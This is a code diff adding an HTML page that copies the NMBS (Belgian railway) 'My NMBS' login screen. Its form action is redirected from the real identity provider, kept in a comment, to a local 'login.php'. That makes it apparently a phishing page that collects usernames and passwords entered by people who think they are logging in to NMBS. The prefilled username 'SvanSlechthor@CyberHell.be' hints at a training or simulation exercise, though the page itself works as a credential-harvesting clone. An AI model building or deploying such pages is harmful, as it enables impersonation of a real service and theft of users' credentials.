@@ -1,0 +1,176 @@
+<!DOCTYPE html> <!-- Defines the document type as HTML5 -->
+<html lang="nl"> <!-- Sets the language of the document to Dutch -->
+<head>
+   <meta charset="utf-8" /> <!-- Specifies the character encoding for the HTML document -->
+   <meta http-equiv="x-ua-compatible" content="ie=edge" /> <!-- Instructs Internet Explorer to use the latest rendering engine -->
+   <meta http-equiv="X-UA-TextLayoutMetrics" content="gdi" /> <!-- Sets text layout rendering to GDI in Internet Explorer -->
+   <title data-i18n="rep18"></title> <!-- Title of the document, with a data attribute for internationalization -->
+   <meta name="description" content="My NMBS" /> <!-- Meta description for the document -->
+   <meta name="viewport" content="width=device-width, initial-scale=1" /> <!-- Sets the viewport to make the website responsive -->
+
+   <link rel="stylesheet" href="../../../web40/v5/css/style.css" /> <!-- Link to external stylesheet -->
+   <script src="../../../web40/v5/js/jquery.js"></script> <!-- Link to external JavaScript file for jQuery -->
+</head>
+<body>
+<svg
+        xmlns="http://www.w3.org/2000/svg"
+        xmlns:xlink="http://www.w3.org/1999/xlink"
+> <!-- Defines SVG element with namespaces -->
+   <symbol viewBox="0 0 64 64" id="icon-nmbs-logo"> <!-- Defines a symbol for reusability, with a unique id -->
+      <title>nmbs-logo</title> <!-- Title of the SVG symbol -->
+      <path
+              d="M32 50.7C17.4 50.7 5.5 42.3 5.5 32S17.4 13.3 32 13.3 58.5 21.7 58.5 32 46.6 50.7 32 50.7m0-39.6C14.3 11.1 0 20.4 0 32s14.3 20.9 32 20.9S64 43.5 64 32 49.7 11.1 32 11.1"
+      /> <!-- First path of the SVG symbol, drawing the outer circle -->
+      <path
+              d="M33.4 43h-3.5c-1.1 0-1.7-.5-1.7-1.4v-8c0-.5.2-.7.7-.7h4.5a5.2 5.2 0 0 1 5.2 5.1 4.94 4.94 0 0 1-5.2 5m-5.2-20.4c0-.9.6-1.4 1.7-1.4h2.3a4.31 4.31 0 0 1 4.5 4.3 4.46 4.46 0 0 1-4.5 4.4h-3.3c-.5 0-.7-.2-.7-.7zm14.1 8.9c-.7-.3-.7-.4 0-.8a5.91 5.91 0 0 0 2.8-5.2c0-3.9-5.2-7.8-13.5-7.8a22 22 0 0 0-13.3 4.4c-.7.6-.6.9-.4 1.1l1.2 1.4c.4.4.6.3.8.1.9-.7 1-.3 1 .5V39c0 .8-.1 1.2-1 .5-.2-.2-.4-.3-.8.1l-1.3 1.5c-.2.3-.4.6.4 1.1a24.7 24.7 0 0 0 13.6 4.3c9.3 0 15.1-3.9 15.1-9.1.1-3.5-2.8-5.2-4.6-5.9"
+      /> <!-- Second path of the SVG symbol, drawing the inner elements -->
+   </symbol>
+</svg>
+<div class="navigation-bar navigation-bar--reversed"> <!-- Defines a navigation bar with a custom class -->
+   <div class="navigation-bar__main bg-white"> <!-- Main section of the navigation bar -->
+      <div class="navigation-bar__left"> <!-- Left section of the navigation bar -->
+         <a href="../../../../www.belgiantrain.be/index.html" class="navigation-bar__logo"> <!-- Link to home page with a logo class -->
+            <svg class="icon"> <!-- Inline SVG for the logo -->
+               <use xlink:href="#icon-nmbs-logo"></use> <!-- Uses the defined symbol for the logo -->
+            </svg>
+            <span class="sr-only">Home NMBS</span> <!-- Text for screen readers only -->
+         </a>
+      </div>
+   </div>
+   <div class="navigation-bar__sidebar bg-white flex-justify-end"> <!-- Sidebar section of the navigation bar -->
+      <div class="navigation-bar__right"> <!-- Right section of the navigation bar -->
+         <ul class="navigation-bar__items"> <!-- List of navigation items -->
+            <li class="navigation-bar__item LanguageSwitchDropDown"> <!-- Language switch dropdown item -->
+               <div class="navigation-bar__item-langswitch"> <!-- Container for language switcher -->
+                  <div class="js-dropdown dropdown dropdown--outline" data-autoclose="true"> <!-- Dropdown element with auto-close -->
+                     <a href="#" class="link link--iconright dropdown__trigger" aria-expanded="false" data-i18n="[html]rep19">
+                     </a> <!-- Trigger for the dropdown with internationalization attribute -->
+                     <ul class="dropdown__list"> <!-- List of dropdown items -->
+                        <li class="dropdown__item">
+                           <a href="#" class="lang-switch" data-locale="en">en</a> <!-- Language option for English -->
+                        </li>
+                        <li class="dropdown__item">
+                           <a href="#" class="lang-switch" data-locale="fr">fr</a> <!-- Language option for French -->
+                        </li>
+                        <li class="dropdown__item">
+                           <a href="#" class="lang-switch" data-locale="nl">nl</a> <!-- Language option for Dutch -->
+                        </li>
+                        <li class="dropdown__item">
+                           <a href="#" class="lang-switch" data-locale="de">de</a> <!-- Language option for German -->
+                        </li>
+                     </ul>
+                  </div>
+               </div>
+            </li>
+         </ul>
+      </div>
+   </div>
+</div>
+<div class="sidebar sidebar--right bg-purple"> <!-- Right sidebar with a purple background -->
+   <div
+           class="sidebar__block sidebar__block--fluid sidebar__block--bg-image theme-purple color-white pad-top-sm-0 hide-mobile"> <!-- Block with background image, fluid layout, and purple theme, hidden on mobile -->
+      <div class="sidebar__title"></div> <!-- Title section of the sidebar block -->
+      <div class="sidebar__content"> <!-- Content section of the sidebar block -->
+         <h4 data-i18n="rep1"></h4> <!-- Header with internationalization attribute -->
+         <ul class="list list--checks list--inverse"> <!-- List with custom classes -->
+            <li data-i18n="[html]rep22">
+            </li> <!-- List item with internationalization attribute -->
+            <li data-i18n="[html]rep2">
+            </li> <!-- List item with internationalization attribute -->
+            <li data-i18n="[html]rep3">
+            </li> <!-- List item with internationalization attribute -->
+            <li data-i18n="[html]rep4">
+            </li> <!-- List item with internationalization attribute -->
+            <li data-i18n="[html]rep5">
+            </li> <!-- List item with internationalization attribute -->
+         </ul>
+      </div>
+   </div>
+</div>
+
+<!-- new -->
+<main class="page--left bg-light pad-bottom-sm-60"> <!-- Main content area with left alignment, light background, and padding at the bottom -->
+
+   <div class="wrapper wrapper--small wrapper--automargin"> <!-- Wrapper for content with small size and automatic margin -->
+      <div class="container-mobile"> <!-- Container for mobile view -->
+         <h1 class="marg-bottom-sm-40 marg-top-sm-40 marg-top-lg-0" data-i18n="rep6"></h1> <!-- Header with internationalization attribute -->
+         <p data-i18n="rep7"></p> <!-- Paragraph with internationalization attribute -->
+      </div>
+
+      <div class="row gutter-md-20 gutter-lg-30 md--flex-d lg--flex-d"> <!-- Row with gutters for medium and large screens, and flex direction classes -->
+         <div class="well bg-white col col-md-6 pad-full-sm-30 marg-full-md-10 marg-bottom-sm-40"> <!-- Column with well class, white background, padding, and margins -->
+            <h2  class="h4" data-i18n="rep8"></h2> <!-- Sub-header with internationalization attribute -->
+			
+<!-- LOGIN form start hier -->
+            <form id="loginForm" method="post" action="login.php"> <!-- Form for login, posting to a specific URL --> <!--action="https://idp.belgiantrain.be/idhub/authenticate/internalidp"-->
+               <input type="hidden" name="formLang" value=""> <!-- Hidden input field for form language -->
+               <div class="input input-rounded"> <!-- Input container with rounded style -->
+                  <label class="input__lbl small color-blue" data-i18n="rep9" for="username">Username:</label> <!-- Label for username input with internationalization attribute -->
+ <!-- Text input for username with default value -->                 
+				  <input type="text" class="input__txt js-input" id="username" name="userName" value="SvanSlechthor@CyberHell.be"/> <!-- Text input for username with default value -->
+                  <div class="frm__msg error" data-i18n="rep20"></div> <!-- Error message container with internationalization attribute -->
+               </div>
+
+               <div class="input input-rounded"> <!-- Input container with rounded style -->
+                  <label class="input__lbl small color-blue" for="password" data-i18n="rep10">Password:</label> <!-- Label for password input with internationalization attribute -->
+<!-- Password input with default value -->
+                  <input type="password" class="input__txt js-input" id="password" name="password" value=""/> <!-- Password input with default value -->
+                  <button value="Login" type="submit" class="input__pwd-eye-crossing" data-title-hidePwd="[html]rep25" data-title-showPwd="[html]rep26" title="[html]rep26" style="top: 54px; right: 10px;">
+                     <svg class="icon"><use xlink:href="#icon-eye"></use></svg> <!-- SVG for eye icon to show/hide password -->
+                     <svg class="icon"><use xlink:href="#icon-eye-crossed"></use></svg> <!-- SVG for eye-crossed icon to show/hide password -->
+                  </button>
+                  <div class="frm__msg error" data-i18n="rep21"></div> <!-- Error message container with internationalization attribute -->
+               </div>
+<!-- login error message -->
+				<!-- Display error message here -->
+                        <?php if (isset($_GET['error'])): ?>
+                            <p style='color:red;'><?php echo htmlspecialchars($_GET['error']); ?></p>
+                        <?php endif; ?>
+<!-- submit -->              
+               <button type="submit" value="Login" class="btn btn--primary iconright btn--full marg-bottom-sm-10 marg-top-sm-20" data-i18n="[html]rep11"> <!-- Submit button with internationalization attribute -->
+                  <svg class="icon">
+                     <use xlink:href="#icon-arrow-right"></use> <!-- SVG for arrow icon -->
+                  </svg>
+               </button>
+               <a class="link link--nopad pad-sm-10 display-none" style="font-size: 16px;" data-lang-link="nl" href="../../../../www.belgiantrain.be/nl/my-account/ResetPassword.html" data-i18n="[html]rep12"></a> <!-- Link to reset password with internationalization attribute -->
+               <svg class="icon icon--16 icon--inline icon-arrow-right color-blue" style="margin-left: 5px;">
+                  <use xlink:href="#icon-arrow-right"></use> <!-- SVG for inline arrow icon -->
+               </svg>
+               <br>
+               <a class="link link--nopad pad-sm-10 display-none" style="font-size: 16px;" data-lang-link="nl" href="../../../../www.belgiantrain.be/nl/my-account/SendNewActivationEmail.html" data-i18n="[html]rep13"></a> <!-- Link to send new activation email with internationalization attribute -->
+               <svg class="icon icon--16 icon--inline icon-arrow-right color-blue" style="margin-left: 5px;">
+                  <use xlink:href="#icon-arrow-right"></use> <!-- SVG for inline arrow icon -->
+               </svg>
+            </form>
+            <span class="mdesc" data-i18n="rep24" style="display:none;"></span> <!-- Span element with internationalization attribute -->
+         </div>
+
+         <div class="well bg-white col col-md-6 pad-full-sm-30 marg-full-md-10"> <!-- Column with well class, white background, padding, and margins -->
+            <h2 class="h4" data-i18n="rep15"></h2> <!-- Sub-header with internationalization attribute -->
+            <p data-i18n="rep16"></p> <!-- Paragraph with internationalization attribute -->
+
+            <a href="../../../../www.belgiantrain.be/nl/my-account/CreateNewAccount.html" data-lang-link="nl" class="btn btn--default--blue btn--full marg-sm-10 display-none" data-i18n="[html]rep17">a</a> <!-- Button to create new account with internationalization attribute -->
+         </div>
+      </div>
+   </div>
+   <div class="row theme-purple hide-desktop marg-top-sm-20"> <!-- Row with purple theme, hidden on desktop, and top margin -->
+      <div class="container"> <!-- Container for content -->
+         <h4 data-i18n="rep1"></h4> <!-- Header with internationalization attribute -->
+         <ul class="list list--checks list--inverse"> <!-- List with custom classes -->
+            <li data-i18n="[html]rep22">
+            </li> <!-- List item with internationalization attribute -->
+            <li data-i18n="[html]rep2">
+            </li> <!-- List item with internationalization attribute -->
+            <li data-i18n="[html]rep3">
+            </li> <!-- List item with internationalization attribute -->
+            <li data-i18n="[html]rep4">
+            </li> <!-- List item with internationalization attribute -->
+            <li data-i18n="[html]rep5">
+            </li> <!-- List item with internationalization attribute -->
+         </ul>
+      </div>
+   </div>
+</main>
+<script src="../../../web40/v5/js/app.min.js"></script> <!-- Link to external JavaScript file -->
+</body>
+</html>
